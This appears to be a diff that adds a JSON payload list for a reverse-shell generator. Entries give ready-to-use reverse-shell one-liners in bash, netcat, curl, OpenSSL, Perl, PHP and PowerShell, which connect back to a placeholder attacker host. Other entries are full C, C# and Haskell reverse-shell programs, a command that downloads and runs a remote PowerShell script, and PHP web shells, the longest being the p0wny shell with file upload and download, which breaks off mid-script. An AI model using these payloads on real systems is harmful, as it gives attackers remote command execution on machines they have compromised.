@@ -1,0 +1,913 @@
+{
+  "cmd": [
+    {
+      "name": "Bash -i",
+      "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Bash 196",
+      "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Bash read line",
+      "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Bash 5",
+      "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Bash udp",
+      "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "nc mkfifo",
+      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "nc -e",
+      "command": "nc {ip} {port} -e {shell}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "nc.exe -e",
+      "command": "nc.exe {ip} {port} -e {shell}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "BusyBox nc -e",
+      "command": "busybox nc {ip} {port} -e {shell}",
+      "meta": [
+        "linux"
+      ]
+    },
+    {
+      "name": "nc -c",
+      "command": "nc -c {shell} {ip} {port}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "ncat -e",
+      "command": "ncat {ip} {port} -e {shell}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "ncat.exe -e",
+      "command": "ncat.exe {ip} {port} -e {shell}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "ncat udp",
+      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "curl",
+      "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "rustcat",
+      "command": "rcat connect -s {shell} {ip} {port}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "C",
+      "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execvp(\"{shell}\", argv);\n\n    return 0;       \n}",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "C Windows",
+      "command": "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"{ip}\"; \r\nchar port[6] = \"{port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "C# TCP Client",
+      "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"{shell}\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
+      "meta": [
+        "linux",
+        "windows"
+      ]
+    },
+    {
+      "name": "C# Bash -i",
+      "command": "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"{shell}\";\n\t  proc.StartInfo.Arguments = \"-c \\\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",
+      "meta": [
+        "linux",
+        "windows"
+      ]
+    },
+    {
+      "name": "Haskell #1",
+      "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "OpenSSL",
+      "command": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Perl",
+      "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "Perl no sh",
+      "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP cmd",
+      "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP cmd 2",
+      "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP cmd small",
+      "command": "<?=`$_GET[0]`?>",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP exec",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP shell_exec",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP system",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP passthru",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
+      "meta": [
+        "linux",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP `",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP popen",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "PHP proc_open",
+      "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+      "meta": [
+        "linux",
+        "windows",
+        "mac"
+      ]
+    },
+    {
+      "name": "Windows ConPty",
+      "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell #1",
+      "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell #2",
+      "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell #3",
+      "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell #4 (TLS)",
+      "command": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell #3 (Base64)",
+      "command": "PowerShell #3 (Base64)",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "P0wny Shell (Webshell)",
+      "command": "<?php\r\n\r\n$SHELL_CONFIG = array(\r\n    'username' => 'p0wny',\r\n    'hostname' => 'shell',\r\n);\r\n\r\nfunction expandPath($path) {\r\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\r\n        exec(\"echo $match[1]\", $stdout);\r\n        return $stdout[0] . $match[2];\r\n    }\r\n    return $path;\r\n}\r\n\r\nfunction allFunctionExist($list = array()) {\r\n    foreach ($list as $entry) {\r\n        if (!function_exists($entry)) {\r\n            return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nfunction executeCommand($cmd) {\r\n    $output = '';\r\n    if (function_exists('exec')) {\r\n        exec($cmd, $output);\r\n        $output = implode(\"\\n\", $output);\r\n    } else if (function_exists('shell_exec')) {\r\n        $output = shell_exec($cmd);\r\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r\n        ob_start();\r\n        system($cmd);\r\n        $output = ob_get_contents();\r\n        ob_end_clean();\r\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r\n        ob_start();\r\n        passthru($cmd);\r\n        $output = ob_get_contents();\r\n        ob_end_clean();\r\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\r\n        $handle = popen($cmd, 'r');\r\n        while (!feof($handle)) {\r\n            $output .= fread($handle, 4096);\r\n        }\r\n        pclose($handle);\r\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\r\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\r\n        $output = stream_get_contents($pipes[1]);\r\n        proc_close($handle);\r\n    }\r\n    return $output;\r\n}\r\n\r\nfunction isRunningWindows() {\r\n    return stripos(PHP_OS, \"WIN\") === 0;\r\n}\r\n\r\nfunction featureShell($cmd, $cwd) {\r\n    $stdout = \"\";\r\n\r\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\r\n        chdir(expandPath(\"~\"));\r\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\r\n        chdir($cwd);\r\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\r\n        chdir(expandPath($match[1]));\r\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\r\n        chdir($cwd);\r\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\r\n        return featureDownload($match[1]);\r\n    } else {\r\n        chdir($cwd);\r\n        $stdout = executeCommand($cmd);\r\n    }\r\n\r\n    return array(\r\n        \"stdout\" => base64_encode($stdout),\r\n        \"cwd\" => base64_encode(getcwd())\r\n    );\r\n}\r\n\r\nfunction featurePwd() {\r\n    return array(\"cwd\" => base64_encode(getcwd()));\r\n}\r\n\r\nfunction featureHint($fileName, $cwd, $type) {\r\n    chdir($cwd);\r\n    if ($type == 'cmd') {\r\n        $cmd = \"compgen -c $fileName\";\r\n    } else {\r\n        $cmd = \"compgen -f $fileName\";\r\n    }\r\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\r\n    $files = explode(\"\\n\", shell_exec($cmd));\r\n    foreach ($files as &$filename) {\r\n        $filename = base64_encode($filename);\r\n    }\r\n    return array(\r\n        'files' => $files,\r\n    );\r\n}\r\n\r\nfunction featureDownload($filePath) {\r\n    $file = @file_get_contents($filePath);\r\n    if ($file === FALSE) {\r\n        return array(\r\n            'stdout' => base64_encode('File not found / no read permission.'),\r\n            'cwd' => base64_encode(getcwd())\r\n        );\r\n    } else {\r\n        return array(\r\n            'name' => base64_encode(basename($filePath)),\r\n            'file' => base64_encode($file)\r\n        );\r\n    }\r\n}\r\n\r\nfunction featureUpload($path, $file, $cwd) {\r\n    chdir($cwd);\r\n    $f = @fopen($path, 'wb');\r\n    if ($f === FALSE) {\r\n        return array(\r\n            'stdout' => base64_encode('Invalid path / no write permission.'),\r\n            'cwd' => base64_encode(getcwd())\r\n        );\r\n    } else {\r\n        fwrite($f, base64_decode($file));\r\n        fclose($f);\r\n        return array(\r\n            'stdout' => base64_encode('Done.'),\r\n            'cwd' => base64_encode(getcwd())\r\n        );\r\n    }\r\n}\r\n\r\nfunction initShellConfig() {\r\n    global $SHELL_CONFIG;\r\n\r\n    if (isRunningWindows()) {\r\n        $username = getenv('USERNAME');\r\n        if ($username !== false) {\r\n            $SHELL_CONFIG['username'] = $username;\r\n        }\r\n    } else {\r\n        $pwuid = posix_getpwuid(posix_geteuid());\r\n        if ($pwuid !== false) {\r\n            $SHELL_CONFIG['username'] = $pwuid['name'];\r\n        }\r\n    }\r\n\r\n    $hostname = gethostname();\r\n    if ($hostname !== false) {\r\n        $SHELL_CONFIG['hostname'] = $hostname;\r\n    }\r\n}\r\n\r\nif (isset($_GET[\"feature\"])) {\r\n\r\n    $response = NULL;\r\n\r\n    switch ($_GET[\"feature\"]) {\r\n        case \"shell\":\r\n            $cmd = $_POST['cmd'];\r\n            if (!preg_match('/2>/', $cmd)) {\r\n                $cmd .= ' 2>&1';\r\n            }\r\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\r\n            break;\r\n        case \"pwd\":\r\n            $response = featurePwd();\r\n            break;\r\n        case \"hint\":\r\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\r\n            break;\r\n        case 'upload':\r\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\r\n    }\r\n\r\n    header(\"Content-Type: application/json\");\r\n    echo json_encode($response);\r\n    die();\r\n} else {\r\n    initShellConfig();\r\n}\r\n\r\n?><!DOCTYPE html>\r\n\r\n<html>\r\n\r\n    <head>\r\n        <meta charset=\"UTF-8\" />\r\n        <title>p0wny@shell:~#</title>\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n        <style>\r\n            html, body {\r\n                margin: 0;\r\n                padding: 0;\r\n                background: #333;\r\n                color: #eee;\r\n                font-family: monospace;\r\n                width: 100vw;\r\n                height: 100vh;\r\n                overflow: hidden;\r\n            }\r\n\r\n            *::-webkit-scrollbar-track {\r\n                border-radius: 8px;\r\n                background-color: #353535;\r\n            }\r\n\r\n            *::-webkit-scrollbar {\r\n                width: 8px;\r\n                height: 8px;\r\n            }\r\n\r\n            *::-webkit-scrollbar-thumb {\r\n                border-radius: 8px;\r\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\r\n                background-color: #bcbcbc;\r\n            }\r\n\r\n            #shell {\r\n                background: #222;\r\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\r\n                font-size: 10pt;\r\n                display: flex;\r\n                flex-direction: column;\r\n                align-items: stretch;\r\n                max-width: calc(100vw - 2 * var(--shell-margin));\r\n                max-height: calc(100vh - 2 * var(--shell-margin));\r\n                resize: both;\r\n                overflow: hidden;\r\n                width: 100%;\r\n                height: 100%;\r\n                margin: var(--shell-margin) auto;\r\n            }\r\n\r\n            #shell-content {\r\n                overflow: auto;\r\n                padding: 5px;\r\n                white-space: pre-wrap;\r\n                flex-grow: 1;\r\n            }\r\n\r\n            #shell-logo {\r\n                font-weight: bold;\r\n                color: #FF4180;\r\n                text-align: center;\r\n            }\r\n\r\n            :root {\r\n                --shell-margin: 25px;\r\n            }\r\n\r\n            @media (min-width: 1200px) {\r\n                :root {\r\n                    --shell-margin: 50px !important;\r\n                }\r\n            }\r\n\r\n            @media (max-width: 991px),\r\n                   (max-height: 600px) {\r\n                #shell-logo {\r\n                    font-size: 6px;\r\n                    margin: -25px 0;\r\n                }\r\n                :root {\r\n                    --shell-margin: 0 !important;\r\n                }\r\n                #shell {\r\n                    resize: none;\r\n                }\r\n            }\r\n\r\n            @media (max-width: 767px) {\r\n                #shell-input {\r\n                    flex-direction: column;\r\n                }\r\n            }\r\n\r\n            @media (max-width: 320px) {\r\n                #shell-logo {\r\n                    font-size: 5px;\r\n                }\r\n            }\r\n\r\n            .shell-prompt {\r\n                font-weight: bold;\r\n                color: #75DF0B;\r\n            }\r\n\r\n            .shell-prompt > span {\r\n                color: #1BC9E7;\r\n            }\r\n\r\n            #shell-input {\r\n                display: flex;\r\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\r\n                border-top: rgba(255, 255, 255, .05) solid 1px;\r\n                padding: 10px 0;\r\n            }\r\n\r\n            #shell-input > label {\r\n                flex-grow: 0;\r\n                display: block;\r\n                padding: 0 5px;\r\n                height: 30px;\r\n                line-height: 30px;\r\n            }\r\n\r\n            #shell-input #shell-cmd {\r\n                height: 30px;\r\n                line-height: 30px;\r\n                border: none;\r\n                background: transparent;\r\n                color: #eee;\r\n                font-family: monospace;\r\n                font-size: 10pt;\r\n                width: 100%;\r\n                align-self: center;\r\n                box-sizing: border-box;\r\n            }\r\n\r\n            #shell-input div {\r\n                flex-grow: 1;\r\n                align-items: stretch;\r\n            }\r\n\r\n            #shell-input input {\r\n                outline: none;\r\n            }\r\n        </style>\r\n\r\n        <script>\r\n            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\r\n            var CWD = null;\r\n            var commandHistory = [];\r\n            var historyPosition = 0;\r\n            var eShellCmdInput = null;\r\n            var eShellContent = null;\r\n\r\n            function _insertCommand(command) {\r\n                eShellContent.innerHTML += \"\\n\\n\";\r\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\r\n                eShellContent.innerHTML += escapeHtml(command);\r\n                eShellContent.innerHTML += \"\\n\";\r\n                eShellContent.scrollTop = eShellContent.scrollHeight;\r\n            }\r\n\r\n            function _insertStdout(stdout) {\r\n                eShellContent.innerHTML += escapeHtml(stdout);\r\n                eShellContent.scrollTop = eShellContent.scrollHeight;\r\n            }\r\n\r\n            function _defer(callback) {\r\n                setTimeout(callback, 0);\r\n            }\r\n\r\n            function featureShell(command) {\r\n\r\n                _insertCommand(command);\r\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\r\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\r\n                } else if (/^\\s*clear\\s*$/.test(command)) {\r\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\r\n                    eShellContent.innerHTML = '';\r\n                } else {\r\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\r\n                        if (response.hasOwnProperty('file')) {\r\n                            featureDownload(atob(response.name), response.file)\r\n                        } else {\r\n                            _insertStdout(atob(response.stdout));\r\n                            updateCwd(atob(response.cwd));\r\n                        }\r\n                    });\r\n                }\r\n            }\r\n\r\n            function featureHint() {\r\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\r\n\r\n                function _requestCallback(data) {\r\n                    if (data.files.length <= 1) return;  // no completion\r\n                    data.files = data.files.map(function(file){\r\n                        return atob(file);\r\n                    });\r\n                    if (data.files.length === 2) {\r\n                        if (type === 'cmd') {\r\n                            eShellCmdInput.value = data.files[0];\r\n                        } else {\r\n                            var currentValue = eShellCmdInput.value;\r\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\r\n                        }\r\n                    } else {\r\n                        _insertCommand(eShellCmdInput.value);\r\n                        _insertStdout(data.files.join(\"\\n\"));\r\n                    }\r\n                }\r\n\r\n                var currentCmd = eShellCmdInput.value.split(\" \");\r\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\r\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\r\n\r\n                makeRequest(\r\n                    \"?feature=hint\",\r\n                    {\r\n                        filename: fileName,\r\n                        cwd: CWD,\r\n                        type: type\r\n                    },\r\n                    _requestCallback\r\n                );\r\n\r\n            }\r\n\r\n            function featureDownload(name, file) {\r\n                var element = document.createElement('a');\r\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\r\n                element.setAttribute('download', name);\r\n                element.style.display = 'none';\r\n                document.body.appendChild(element);\r\n                element.click();\r\n                document.body.removeChild(element);\r\n                _insertStdout('Done.');\r\n            }\r\n\r\n            function featureUpload(path) {\r\n                var element = document.createElement('input');\r\n                element.setAttribute('type', 'file');\r\n                element.style.display = 'none';\r\n                document.body.appendChild(element);\r\n                element.addEventListener('change', function () {\r\n                    var promise = getBase64(element.files[0]);\r\n                    promise.then(function (file) {\r\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\r\n                            _insertStdout(atob(response.stdout));\r\n                            updateCwd(atob(response.cwd));\r\n                        });\r\n                    }, function () {\r\n                        _insertStdout('An unknown client-side error occurred.');\r\n                    });\r\n                });\r\n                element.click();\r\n                document.body.removeChild(element);\r\n            }\r\n\r\n            function getBase64(file, onLoadCallback) {\r\n                return new Promise(function(resolve, reject) {\r\n                    var reader = new FileReader();\r\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\r\n                    reader.onerror = reject;\r\n                    reader.readAsDataURL(file);\r\n                });\r\n            }\r\n\r\n            function genPrompt(cwd) {\r\n                cwd = cwd || \"~\";\r\n                var shortCwd = cwd;\r\n                if (cwd.split(\"/\").length > 3) {\r\n                    var splittedCwd = cwd.split(\"/\");\r\n                    shortCwd = \"…/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\r\n                }\r\n                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\r\n            }\r\n\r\n            function updateCwd(cwd) {\r\n                if (cwd) {\r\n                    CWD = cwd;\r\n                    